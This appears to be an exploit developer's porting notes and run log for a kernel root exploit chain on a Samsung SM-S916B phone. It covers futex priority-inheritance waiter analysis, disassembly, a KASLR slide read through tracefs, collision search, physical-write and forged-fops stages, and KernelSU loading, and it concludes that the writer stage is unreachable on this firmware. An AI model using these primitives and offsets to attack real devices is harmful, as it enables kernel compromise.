`rt_mutex_adjust_pi()` or any PI state. The gregkh tags agree: `kernel/locking/rtmutex.c`,
`rtmutex_api.c` and `kernel/futex/core.c` are byte-identical between `v5.15.189` and `v5.15.197`.
So the two firmwares' *Android* kernels behave identically on this path.

### Every path clears the reference before userspace resumes

There are only two proxy-lock call sites in `futex_requeue`'s reachable set, and both end with
`pi_blocked_on == NULL`:

- `futex_requeue()` (the `FUTEX_CMP_REQUEUE_PI` syscall) calls the removing wrapper
  (`kernel/futex/core.c` -> `rt_mutex_start_proxy_lock`). Inside, `task_blocks_on_rt_mutex()` sets
  `task->pi_blocked_on = waiter`, the chain walk returns `-EDEADLK`, and the wrapper calls
  `remove_waiter()`, which does `rt_mutex_dequeue()` and `pi_blocked_on = NULL`. `remove_waiter()`
  early-returns only when `waiter->task == NULL` - never on this path, because the waiter was enqueued.
- `futex_lock_pi()` uses the non-removing `__rt_mutex_start_proxy_lock()`, but on any error (including a
  timeout from `rt_mutex_wait_proxy_lock()`) it falls through to `rt_mutex_cleanup_proxy_lock()`, which
  calls `remove_waiter()` unless the task became the owner - and becoming the owner goes through
  `try_to_take_rt_mutex()`, which also clears `pi_blocked_on`.

`rt_mutex_adjust_pi()` is the consumer's only entry (`__sched_setscheduler` -> `rt_mutex_adjust_pi`), and
it is a no-op when `task->pi_blocked_on` is `NULL`.

### The binary says the same thing

The exact UAGZIF `vmlinux.elf` removes the waiter only for `ret < 0` and clears the field:

```text
rt_mutex_start_proxy_lock  0xffffffc0096f9464
  ... bl task_blocks_on_rt_mutex
  ... cbz w0, <skip>          ; ret == 0            -> no removal
  ... ldar x8,[x19,#0x18]     ; lock->owner
  ... cmp x8,#2 ; b.hs        ; a real owner keeps ret
  ... mov w21,wzr             ; !owner              -> ret = 0 (skip)
  ... tbz w21,#0x1f, <skip>   ; ret >= 0            -> no removal
  ... bl remove_waiter        ; ret < 0             -> remove

remove_waiter               0xffffffc0096f7474
  ... bl rb_erase             ; 0xffffffc008ac6d7c  (the dequeue)
  ... str xzr,[x20,#0x8b0]    ; task->pi_blocked_on = NULL

rt_mutex_adjust_pi          0xffffffc0096f98b8
  ... ldr x21,[x19,#0x8b0]    ; BTF: pi_blocked_on
  ... cbz  ...                ; NULL -> return
```

So at the moment the consumer's `sched_setattr` runs, `pi_blocked_on` is `NULL`: no
`rt_mutex_adjust_prio_chain`, no forged-waiter walk, no `rb_erase_cached`. `window=1` and `sched_ok=1`
are both measured upstream of that erase and are true on a miss, which is exactly what runs 5 and 6
showed. This is a reachability failure, not a race, and re-timing the `sched_setattr` cannot fix it.

### What is left to explain, and why it is not offline-decidable here

The sibling reached root with the same writer on the same phone, so *something* differs on
`S916BXXSAFZG1`. Since both Android bases are byte-identical on this path, the difference can only live
in Samsung's own patch stack (or a device config), and this machine has neither the `S916BXXSAFZG1`
`vmlinux`/Image nor Samsung's released `SM-S916B_16_Opensource` tree, so that diff cannot be made here.
The remaining possibilities are:

1. A Samsung patch on `.189` that leaves the proxy waiter enqueued on the `-EDEADLK` path (or otherwise
   keeps `pi_blocked_on` set across the return). This is the only kernel-side explanation that fits, and
   it is testable only against the FZG1 binary or source.
2. The sibling's reported success is real but depends on state this profile cannot recreate on `.197`
   (for example a different reclaim/collect order that changes *when* the waiter tid is scheduled).

Neither can be confirmed from this machine. What *can* be stated plainly: the MCAST stale-waiter writer
as shipped is unreachable on `S916BXXUAGZIF`, and no constant, layout or timing change in the current
app will make it reachable. A working port needs either the FZG1 kernel artefacts to identify the
discriminator, or a different primitive that does not depend on a stale `pi_blocked_on`.

## Gates before this is published anywhere

Each of these is a refusal, not a warning - the sibling port's record is explicit about what happens
when one is skipped:

1. **Every P0 row read back from the Image.** The generator verifies each of the 256 qwords through a
   second file handle; a table that cannot be read back is a table generated from the wrong file.
2. **Every symbol resolved, none defaulted.** `target_report.py` exits non-zero and lists what is
   missing; `emit_target.py` refuses to write a partial header.
3. **Struct offsets agree with this build's BTF.** 53 carried constants agree today. A layout macro that
   changes between releases is a chain rewrite, not a number to paste.
4. **One hardware attempt, in `adb shell`, per boot.** The S916B chain's slide discovery needs tracefs,
   and a payload that failed after the stack writer left PI state behind that a second attempt on the
   same boot must not disturb. The proven domain is `uid=2000` `u:r:shell:s0`.
5. **The KernelSU pair matched to this build** (`docs/PORTING.md` section 7): module and `ksud` from the
   same source and release, with the kallsyms-aware late-load path - not a pair assembled from two
   builds.

Gate 4 is the one this record cannot tick. Until it is, the port is measurable and buildable, not proven.

## Why this is not in `support/targets-v3.json`

It must not be, yet, and the reason is not caution about the port's quality:

- The app reads `kernelsu-generic.json` **only when a device has no entry of its own**. Listing
  SM-S916B at `5.15.197` would therefore *replace* the generic tier that currently serves this phone
  with a profile the app cannot execute.
- The chain needs `tracefs` for the KASLR slide, which an app uid cannot open. The sibling port's
  README says the same thing about the same device: an APK frontend would have to delegate the runner
  to an ADB-shell or Shizuku shell service, and that integration does not exist.

So the ordering is: validate over `adb shell` first; then, if the payload is to be offered in the app,
build the shell-bridge launch path and add the feed entry in the same change - never the entry first,
because a feed entry is what makes the app stop using the path that works.

## Log

| Date | What happened |
| --- | --- |
| 2026-11-23 | Target scaffolded: `target.h` (carried layout), `measured.h` (an `#error`), `tools/port/` pipeline with self-tests. |
| 2026-11-23 | Scaffold verified without a firmware: `tools/port/syntax_check.py` compiles the header four ways (app/standalone x with/without the optional measurements) against stub measurements, and diffs its macro names against `dm2q-S916BXXSAFZG1` - every macro the sibling header defines is defined or measured here. |
| 2026-11-23 | Device read over `adb`: kernel and fingerprint confirmed, `SLIDE_TRACEFS_EVENT_ID` = 108 measured, tracefs writable by `u:r:shell:s0`, config flags recorded. |
| 2026-11-23 | `boot.img` pulled while the late-load root was up (100663296 bytes, sha256 `ed1c34b5...`), unwrapped to the raw Image (46860800 bytes, sha256 `cc591b86...`), symbolled to 126441 offsets. Header read: `image_size 0x2f50000`, `text_offset 0`, `0x29f600` bytes of `.bss` not stored. |
| 2026-11-23 | All 26 macros measured, event id `108`, both tracefs callers disassembled (`0x0010ddfc`, `0x000c90bc`). Three tool bugs found by the measurement - the `boot_id` string, the logger's name, the ashmem miscdevice - plus the `btf.py` walk desync at type 139399, `random_table.py`'s undefined `MACRO`, and `emit_target.py`'s include order. |
| 2026-11-23 | `measured.h` generated (29 values, each naming its source) and `p0_fingerprint.h` written from the exact Image (32 rows, 256 source qwords verified). `layout_check.py` says all 53 carried constants agree with this build's BTF; `syntax_check.py` passes; `release` and `all` compile and link with NDK 28.2.13676358 (`release` padded to 104128 by hand - the recipe's `stat -c` is GNU). Not run on hardware. |
| 2026-11-23 | Hardware run 1: slide passed (`base=ffffffc008150000`, `slide=0x150000`, both tracefs callers exact), collision search failed with `only found N collisions`. |
| 2026-11-23 | Hardware run 2 (`KSNITCH_TIMING_DIAG=1`): four searches on one boot, `approx_time=27..28`, `max=296..362`, `n=81918`. Baseline is tight, so the failure is structural, not noise. Found that `reclaim=controlled` never calls `configure_kernelsnitch_profile`, so `SLIDE_KSNITCH_*` was never in play; the stage hardcodes `set_profile(256, REPEAT_MEASUREMENT, AVERAGE)` and `S918_KSNITCH_FULL_COLLISIONS`. Also fixed the `SYSCHK(pthread_create(...))` bug (it returns `+errno`, never `-1`). |
| 2026-11-23 | Hardware run 3 (`KSNITCH_TIMING_DIAG=1`): pile probe proves the pile lands - `requested=256 created=256 woke=256 wake_all=720123 per_entry=2812` - and the histogram is `over2=36 over5=36 over10=2..6`. 36 matches the `81918/2048` prediction for the piled bucket, so the signal is real and the `10x` cutoff sits inside it. |
| 2026-11-23 | Hardware run 4 (`KSNITCH_THRESHOLD_MULT=4`): collision stage passed on every attempt, then only DMA32-zone leaks at ~125 s/attempt until the 420 s cap. |
| 2026-11-23 | Hardware run 5 (`KSNITCH_THRESHOLD_MULT=2`, 900 s): first full chain - normal-zone group at attempt 63, `sends=8192` SKB reclaim, `kernel page prepare` in 98 s, full PI sequence, `writer-return ... window=1`, `p0 physical write status=0 ok=1` - then `cfi misc_fops mismatch ret=0 read=0`. Disassembly of this kernel's `configfs_read_iter` and `ashmem_ioctl` shows the read-back forge is sound, so `ret=0` is the real `ashmem_read_iter` and the fake-fops pointer did not land. Boot spent by design. |
| 2026-11-23 | `KERNELSNITCH_THRESHOLD_MULT` set to `2` in `target.h` (the measured signal is 2x-5x the baseline with an empty band between, so 2 and 5 admit the same 36 probes and 2 confirms them reliably); the environment override stays for one-boot sweeps. |
| 2026-11-24 | Writer stage re-checked offline, since run 5's miss is the only open failure. `MCAST_WAITER_OFF 0x78` re-derived from this Image (futex waiter `E-0x338`, `greqs` `E-0x3b0`), so the biggest "wrong carried constant" candidate is ruled out. The read-back model was re-verified against `configfs_read_once`: `count` is the untouched `dev/ashm` prefix and `count - ki_pos = window >= len`, so a landed write always reads back 8 bytes and `ret=0` is a real miss; a `fake_fops | 1` write is also excluded, because the next `open()` would install it and the `read_iter` load one byte into the table would fault instead of continuing. Every shared `APP_*`/`FAKE_*`/`CFG_*`/`P0_*` macro value is identical to the proven sibling. No offline constant or layout error remains in this stage. |
| 2026-11-24 | Hardware run 6 (control, identical command on a fresh boot): reproduced run 5 line for line at slide `0x1e0000` / base `ffffff8895f38000`, group 5 attempt 89, page in 128 s, `calls=1 sched_ok=1 window=1`, `mismatch ret=0 read=0`. Two boots, two layouts, one outcome - so this is not the `X916B` "half the time" race and not a coin flip; the write is never produced. Also establishes that `window`/`sched_ok` are upstream of the forged erase and true on a miss, and that the only `sched_setattr` fires after `setsockopt` has returned. Boot spent; no retry by design. |
| 2026-11-24 | Offline: the writer's remaining kernel-version explanation is dead. Upstream `v5.15` already ships the `rtmutex_api.c` split (`531ae4b06a73`, 2021-08-17, ancestor of `android13-5.15.189_r00`), so the removing `rt_mutex_start_proxy_lock` cannot be missing from the sibling. ACK `android13-5.15.189_r00` vs `android13-5.15.197_r00` have zero diff under `kernel/locking/` and `kernel/futex/`; the only `kernel/sched/core.c` changes are `get_wchan()`, vendor trace hooks and an export. The UAGZIF binary confirms `rt_mutex_start_proxy_lock` calls `remove_waiter` only for `ret < 0`, and `remove_waiter` stores `NULL` to `[task+0x8b0]` (`pi_blocked_on`), while `rt_mutex_adjust_pi` returns on `NULL`. So `cmp`'s `EDEADLK` and the `wait_requeue_pi` timeout both leave `pi_blocked_on` cleared; `rt_mutex_adjust_prio_chain` never runs and the forged `rb_erase` never happens. The stale-waiter writer is unreachable on this build, re-timing cannot fix it, and the FZG1 discriminator is not offline-decidable (no FZG1 vmlinux/Image or Samsung source on this machine). |
